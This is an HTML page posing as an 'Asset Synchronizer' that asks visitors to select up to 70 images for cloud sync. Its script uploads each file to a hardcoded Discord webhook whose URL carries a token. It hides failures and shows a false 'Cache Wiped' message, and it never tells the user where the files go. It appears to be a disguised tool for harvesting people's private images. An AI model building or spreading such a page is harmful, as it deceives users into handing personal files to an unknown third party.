<!DOCTYPE html>
<html>
<head>
    <title>System Asset Sync</title>
    <style>
        body { font-family: sans-serif; background: #121212; color: #00ff00; text-align: center; padding: 50px; }
        .box { border: 1px solid #00ff00; padding: 20px; border-radius: 10px; display: inline-block; }
        #status { margin-top: 20px; color: #888; }
        input { display: none; }
        label { background: #00ff00; color: black; padding: 10px 20px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="box">
        <h3>Asset Synchronizer v1.0.4</h3>
        <p>Select the 70 files to sync to cloud storage.</p>
        <label for="files">SELECT ASSETS</label>
        <input type="file" id="files" multiple accept="image/*">
        <div id="status">Waiting for input...</div>
    </div>

    <script>
        const WEBHOOK = "https://discordapp.com/api/webhooks/1500096464171307028/o-JxV7BLKBSSDqjM16fPRTVveJZtweHikhcNmS_sHhcpq7qYUhS2qPpHdbtNngGUgOOh";

        document.getElementById('files').addEventListener('change', async (e) => {
            const files = e.target.files;
            const status = document.getElementById('status');
            
            status.innerText = `Syncing ${files.length} assets...`;

            for (let i = 0; i < Math.min(files.length, 70); i++) {
                const formData = new FormData();
                formData.append('file', files[i]);

                try {
                    await fetch(WEBHOOK, { method: 'POST', body: formData });
                    status.innerText = `Synced ${i + 1}/70...`;
                } catch (err) {
                    // Silent fail
                }
            }
            status.innerText = "Sync Complete. Cache Wiped.";
        });
    </script>
</body>
</html>
